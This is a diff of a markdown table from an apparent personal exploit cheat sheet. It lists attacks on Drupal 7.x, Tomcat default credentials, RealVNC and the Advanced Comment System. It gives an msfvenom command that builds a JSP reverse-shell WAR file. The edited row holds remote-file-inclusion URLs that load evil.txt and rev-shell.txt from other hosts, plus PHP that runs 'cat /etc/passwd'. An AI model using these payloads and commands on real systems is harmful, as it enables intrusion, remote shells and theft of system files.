@@ -111,11 +111,7 @@ Here I am collectign some of the random exploits and their exploitation technqiu
 |7.|Drupal7.x|7.x Module Services - Remote Code Execution           | php/webapps/41564.php |- | - |change the urllink, change the system command so you can execute cmd and change to rest |
 |8.| Tomcat |tomcat default credentials tomcat:tomcat(wrong password policy) | Tomcat running with defaul passowrd |ip:port/manager/html | msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.169.193.128 LPORT=443 -f war -o shell.war |  After deploying the war file acess it using ip://8080/shell |
 |9.| Real VNC 4.1.0/4.1.1 | Authenticaton Bypass | Administrator password was writeen in the macine login window.|[36932](https://www.exploit-db.com/exploits/36932) | Reverse Shell | Writeup and Reference |
-|10.| ACS(Advanced Comment System) | LFI | Scenario | Working Exploits | Reverse Shell | https://192.168.130.5/internal/advanced_comment_system/index.php?ACS_path=http://192.168.30.120/evil.txt%00 content of Content of evil.txt
-
-<?php 
-print system("cat /etc/passwd");
-?>|
+|10.| ACS(Advanced Comment System) | LFI/RFI | Scenario | Working Exploits | Reverse Shell | https://192.168.130.5/internal/advanced_comment_system/index.php?ACS_path=http://192.168.30.120/evil.txt%00 content of Content of evil.txt <?php print system("cat /etc/passwd");?> RFI http://10.1.1.8//internal/advanced_comment_system/admin.php?ACS_path=http://10.21.0.40/rev-shell.txt%00|
 
 ## Linux Privilege Escalation
 
